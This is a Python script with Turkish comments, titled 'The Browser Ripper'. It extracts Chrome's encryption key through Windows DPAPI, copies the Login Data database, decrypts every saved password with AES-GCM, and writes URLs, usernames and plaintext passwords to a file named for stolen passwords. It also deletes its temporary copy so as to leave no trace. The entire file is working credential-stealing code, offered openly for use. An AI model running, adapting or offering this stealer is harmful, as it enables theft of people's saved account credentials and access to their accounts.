import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import datetime

# --- THE BROWSER RIPPER ---
# AMAÇ: Chrome/Edge tarayıcılarındaki kayıtlı şifreleri (AES-256) çözmek.
# GERÇEK TEKNİK: DPAPI bypass ve AES-GCM Decryption.

def get_encryption_key():
    # 1. Chrome'un "Local State" dosyasını bul (Anahtar burada gizli)
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # 2. Anahtarı Base64'ten çöz
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    
    # 3. DPAPI ön ekini (ilk 5 bayt) at
    key = key[5:]
    
    # 4. Windows DPAPI kullanarak anahtarı deşifre et (Master Key'i al)
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        # Chrome v80+ AES-GCM kullanır
        # İlk 3 bayt "v10" ön ekidir, atıyoruz.
        iv = password[3:15]
        payload = password[15:]
        
        # Şifreyi çöz
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        
        # Son 16 bayt tag verisidir, temizliyoruz
        return decrypted_pass[:-16].decode()
    except:
        return "[Şifre Çözülemedi veya Boş]"

def main():
    # Şifrelerin olduğu veritabanı yolu
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
    
    # Veritabanı kilitli olabilir (Chrome açıksa), bu yüzden kopyasını alıyoruz
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    
    # Anahtarı al
    key = get_encryption_key()
    
    # Veritabanına bağlan
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    
    # Şifre tablosunu sorgula (url, kullanıcı adı, şifreli veri)
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created from logins order by date_created")
    
    print("-" * 50)
    print(f"[*] TARAYICI SÖKÜLÜYOR... ({datetime.now()})")
    print("-" * 50)

    count = 0
    # Dosyaya kaydetmek için açıyoruz
    with open("CALINAN_SIFRELER.txt", "w", encoding="utf-8") as f:
        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = decrypt_password(row[3], key)
            
            if username or password:
                output = f"URL: {origin_url}\nUSER: {username}\nPASS: {password}\n" + "-"*50 + "\n"
                print(output) # Ekrana bas
                f.write(output) # Dosyaya yaz
                count += 1

    cursor.close()
    db.close()
    
    # Geçici dosyayı sil (İz bırakma)
    try:
        os.remove(filename)
    except:
        pass

    print(f"\n[OK] Toplam {count} adet şifre 'CALINAN_SIFRELER.txt' dosyasına kaydedildi.")

if __name__ == "__main__":
    main()